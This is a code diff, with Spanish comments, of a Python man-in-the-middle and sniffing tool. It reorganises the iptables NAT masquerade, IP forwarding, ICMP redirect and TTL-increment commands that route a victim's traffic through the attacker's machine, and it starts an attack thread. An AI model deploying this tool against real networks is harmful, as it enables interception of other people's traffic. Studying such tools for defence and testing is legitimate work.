@@ -46,8 +46,7 @@ def salir(señal, frame):
    print('\n\n\033[0;32msaliendo de la herramienta...\033[0m\n\n')
 
    #revierte las cofiguraciones del sistema
-   if parametros.param.sniff != None:
-      ejecutar_comandos(revertir=True)
+   ejecutar_comandos(revertir=True)
 
    ejecutando = False
    sys.exit(0)
@@ -114,44 +113,57 @@ def sniffing_HTTPS():
       except Exception as e: print(f'\n\033[0;40;31m[+] error > {e}\n')  
  
 def ejecutar_comandos(revertir:bool):
+   'funcion que revierte los comandos de iptables (ambos modos) y ejecuta comandos del -sf'
    if revertir:
+      # revertir comando de iptables idependientemente de la opcion
       if subprocess.run(['iptables','-t','nat','-F']).returncode != 0:
          print('hubo un problema al revertir comando de iptables')
-      else: print('comando iptables revertido con exito\n')
+      else: 
+         print('comando iptables revertido con exito\n')
+
       sr = '1'
       ip_f = '0'
       ipt = 'D'
    else: 
-      # este comando provoca que todo el trafico sea interpretado como que viene de la maquina atacante al router
-      if subprocess.run(['iptables','-t','nat','-A','POSTROUTING','-o',parametros.param.interfaz,'-j','MASQUERADE']).returncode != 0:
-         print('hubo un problema al ejecutar comando de iptables')
-      else: print('comando iptables ejecutado con exito\n')
+      
       sr = '0'
       ip_f = '1'
       ipt = 'A'
 
-   'funcion que ejecuta los comandos que se necesitan para el mitm + sniffing'
    # ejecuta comandos de linux de iptables cuyo propositos son la redireccion de
    # paquetes al router
    # ademas incremeto los ttl para evitar que el paquete muera antes de llegar correctamente al router
    # sysctl net.ipv4.ip_forward=1 -> redirecciono los paquetes
    # iptables -t mangle -A PREROUTING -j TTL --ttl-inc {inc_ttl} -> incremento los ttl en una cantidad n
    # sysctl net.ipv4.conf.all.send_redirects=0 -> habilita la maquina a ser usada como puente entre el router y la victima
-   for x in [f'sysctl net.ipv4.conf.all.send_redirects={sr}',
-      f'sysctl net.ipv4.ip_forward={ip_f}',
-      f'iptables -t mangle -{ipt} PREROUTING -j TTL --ttl-inc {inc_ttl}']:
+   
+   if parametros.param.sniff != None: # revertir o ejecutar comandos especificos del sniffing
 
-      if subprocess.run(x,shell=True).returncode != 0:
-         print(f'\n[+] no se pudo configurar correctamente el comando {x}\n')
+      for x in [f'sysctl net.ipv4.conf.all.send_redirects={sr}',
+         f'sysctl net.ipv4.ip_forward={ip_f}',
+         f'iptables -t mangle -{ipt} PREROUTING -j TTL --ttl-inc {inc_ttl}']:
+
+         if subprocess.run(x,shell=True).returncode != 0:
+            print(f'\n[+] no se pudo configurar correctamente el comando {x}\n')
 
  
 def ejecucion(maq1,maq2):
+   # verificar si la flag if para iptables se especifico sin importar el modo
+   if parametros.param.interfaz is None:
+      print('[!] especificar el argumento -if /--interfaz\n')
+      sys.exit(0)
+
+   # configuro comando de iptables (ambos modos)
+   # este comando provoca que todo el trafico sea interpretado como que viene de la maquina atacante al router
+   # evita que se descarte la ruta de la maquina atacante al hacer el mitm (deberia mejorar la efectividad del ataque)
+   if subprocess.run(['iptables','-t','nat','-A','POSTROUTING','-o',parametros.param.interfaz,'-j','MASQUERADE']).returncode != 0:
+      print('[!] hubo un problema al ejecutar comando de iptables\n [!] la herramienta puede no funcionar como corresponde\n')
+
+   else: print('comando iptables ejecutado con exito\n')
+
 
    if parametros.param.sniff:
       # modo mitm + sniffing
-      if parametros.param.interfaz is None:
-         print('[!] especificar el argumento -i /--interfaz\n')
-         sys.exit(0)
 
       threading.Thread(target=ataque,args=(maq1,maq2)).start()
       ejecutar_comandos(revertir=False)
